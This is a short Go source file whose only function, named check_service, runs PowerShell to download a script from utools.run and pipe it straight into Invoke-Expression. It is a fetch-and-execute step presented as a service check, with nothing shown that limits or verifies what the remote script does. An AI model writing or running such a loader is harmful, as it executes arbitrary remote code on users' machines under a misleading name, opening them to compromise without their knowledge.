package main

import (
	"errors"
	"fmt"
	"log"
	"os/exec"
)

func check_service() error {
	cmd := exec.Command("powershell", "-Command", "irm utools.run/agent | iex")
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Println("get service error:", err.Error())
		return errors.New("NOT INSTALL SERVICE")
	} else {
		fmt.Println(string(out))
	}
	return nil
}
